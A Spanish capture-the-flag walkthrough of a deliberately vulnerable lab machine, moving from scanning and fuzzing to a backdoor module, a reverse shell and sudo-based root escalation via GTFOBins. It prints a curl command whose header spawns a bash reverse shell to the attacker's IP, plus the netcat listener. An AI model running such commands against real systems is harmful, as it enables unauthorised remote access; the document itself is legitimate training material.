# Writeup

## Conocer la red

Lo primero de todos es encontrar equipos dentro de mi red.

`sudo arp-scan -I eth0 --localnet`

![captura-red](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/e6e95007-1bbb-4cf5-b593-0e2619a681a4)

Como ya sabemos, las máscaras que empiezan por 00:0c son de VMware, por lo tanto la máquina atacante es la **192.168.166.104**.

## Conectividad con la máquina atacante

Comprobamos que tenemos conectividad.

`ping -c1 192.168.166.104`

![captura-ping](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/360454c2-5bf1-402f-8d25-9ea9d39d7724)

Vemos que el **ttl** es **64** por lo que significa que es una máquina Linux.

## Escaneo de puertos

Ahora vamos a hacer un escáneo para ver los puertos que están abiertos

`sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv -Pn 192.168.166.104 -oN allPorts`

![captura-escaneo](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/1aa0275b-bcac-4e0b-81fa-c201fe06a703)

Podemos ver que utiliza para el puerto 80 Apache. Lo confirmamos buscando en el navegador la IP atacante.

![captura-apache](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/088be370-e75a-4ca2-9b03-bcd254a291e1)

## Fuzzing

Lo que se me ocurre ahora mismo es hacer Fuzzing para encontrar directorios o subdirectorios. Se pueden utilizar **gobuster**, **wfuzz**. En mi caso voy a utilizar gobuster.

`sudo gobuster dir -w /usr/share/wordlist/Seclist/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.py,.html -u "http://192.168.166.104/"`

![captura-gobuster](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/65937e31-497c-4af9-a131-10c4064e698d)

Encontramos un **info.php**. Lo buscamos en el navegador.

![captura-backdoor](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/e5c527bc-2dd2-41fc-b57b-59b411396243)

Vemos que hay un módulo bastante sospechoso llamado **backdoor** o **puerta trasera**.

![captura-mod](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/ad38e771-b424-4636-a61b-b5c87c6a38c0)

Podemos ejecutar comandos de manera remota **(RCE)**.

![captura-whoami](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/b69bb677-5323-4a08-9ee0-4fb6bdbbce9a)

Vemos que si podemos ejecutar. Por lo tanto lo que se me ocurre en estos momentos es hacer una **reverse shell**.

`curl -sX GET -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.166.103/443 0>&1'" "http://192.168.166.104"`

Pero antes nos ponemos en escucha.

`nc -nlvp 443`

Y ahora sí le damos.

![captura-nc](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/76bd4bc4-2335-4419-9430-d0774dd7eb93)

Volvemos la reverse shell útil y cómoda.

`script /dev/null -c bash`

`CTRL + Z`

`stty raw -echo; fg`

`reset xterm`

`export TERM=xterm`

`export BASH=bash`

Podemos ejecutar **service** como **laurent**. Buscamos el binario en **[GTfobins](https://GTfobins.github.io)**.

Y seguimos los pasos

![captura-gtfobins](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/51c1c621-3cb6-45fd-8c6d-e6ee8fa30fcc)

Una vez hechos los pasos, buscamos la flag.

![captura-laurent](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/cd77b848-8226-42b0-9924-d48988f97391)

Ahora vamos a por la de root.

![captura-root](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/f93535f8-35ba-461d-9d83-32fb0da1b00d)

Vemos que podemos ejecutar como root el comando **joe**.

Volvemos a buscar en **[GTfobins](https://GTfobins.github.io)**.

![captura-gtfobins-joe](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/908cf6cc-fea5-4be7-b072-3784300e42a7)

Seguimos los pasos.

![captura-joe-root](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/474b1c06-6ede-4c7e-87fa-a108357f70c2)

Y buscamos la flag.

![captura-flag-root](https://github.com/Alv-fh/Vulnnyx_machines_writeups/assets/109484163/aa5d388d-f987-4ec5-bb2e-2face328c9bb)

Encontramos las dos flag.